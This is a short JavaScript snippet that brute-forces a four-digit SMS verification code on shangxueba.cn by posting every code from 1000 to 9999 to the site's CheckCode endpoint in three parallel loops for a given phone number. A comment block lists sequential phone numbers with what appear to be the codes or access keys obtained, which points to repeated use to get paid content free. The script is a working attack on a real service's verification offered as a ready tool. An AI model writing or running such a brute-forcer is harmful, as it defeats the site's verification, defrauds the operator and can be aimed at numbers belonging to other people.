(function(phone){
    let isStop = false
    let fun1 = (code,Mobile,max)=>{
        if(code<max&&!isStop){
            $.post("http://www.shangxueba.cn/ajax/getpaperfree.aspx?action=CheckCode",{
                code,
                Mobile
            },function(e){
                if(e=='5'){
                    fun1(code+1,Mobile,max);
                }else{
                    alert(code)
                    console.log(code);
                    isStop = true;
                }
            })
        }
    }
    let code = 1000;

    fun1(code,phone,3999);
    fun1(code+3000,phone,6999);
    fun1(code+6000,phone,9999);
    // let code = 1000;
    // for(let i = 1;i<10;i++){
    //     fun1(i*1000,phone,(i+1)*1000-1);
    // }

})("18611211139")
// 18611211139  20170411Q2UHA8QNE8MQ
// 18611211138  20170410TVVW6V8HEDTY
// 18611211137  20170410MIZ03IXBCEKJ
// 18611211136  20170410YWLCXOEWV8AO
// 18611211135  20170410IQJJ5UXUUWTT
// 18611211133  20170409P9B0DK3WXP3H
// 18611211132  20170409N86EAQDMUSCL -
// 18611211131  20170409J6MID9VXIWD5
// 18611211130  20170409YUIPIZT3OOML
// 18611211129  20170404EX7GBC2PNUX9
// 18611211128  6608
// 18611211126  7578
// 18611211125  4581
// 18611211124
// 18611211123
// 18611211122
// 18611211121
// 18611211120  201703219NDZBC76N2SX
// 18611211119  2017031833YH9AGWPP9S
// 18611211118  20170307MG9QVYSZ2PPJ
// 18611211117  20170307FUSQRLWUQG4U
// 18611211116  201703066TBG61DD016D
// 18611211115  2017030558TY4A60L1OD
// 18611211114  20170305SDSIQFZMQILX
// 18611211113  20170305OKG7SHJ3EAUD
// 18611211111  201703053EVUJG9X1TXG
//
